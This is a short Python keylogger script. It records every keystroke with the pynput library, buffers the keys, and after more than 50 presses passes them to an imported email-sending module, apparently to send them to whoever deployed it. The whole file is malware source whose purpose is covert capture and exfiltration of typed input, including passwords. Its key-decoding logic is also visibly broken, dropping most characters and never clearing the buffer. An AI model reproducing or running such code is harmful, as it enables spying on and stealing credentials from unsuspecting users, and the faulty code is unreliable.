import pynput;
from pynput.keyboard import Key,Listener;
import keylogger.send_email as send_email;

count=0
keys=[]
def on_press(key):
    print(key,end=" ")
    print("pressed")
    global keys,count
    keys.append(str(key))
    count+=1
    if count >50:
        count=0
        email(keys)

def email(keys):
    message = ""
    for key in keys:
        k = key.replace("'", "")
        if key == Key.space:
            k = " "
        elif key == Key.enter:
            k = "\n"
        else:
            k = ""
        message += k
    print(message)
    send_email.sendEmail(message)


def on_release(key):
    if key==Key.esc:
        return False
with Listener(on_press=on_press,on_release=on_release) as listener:
    listener.join()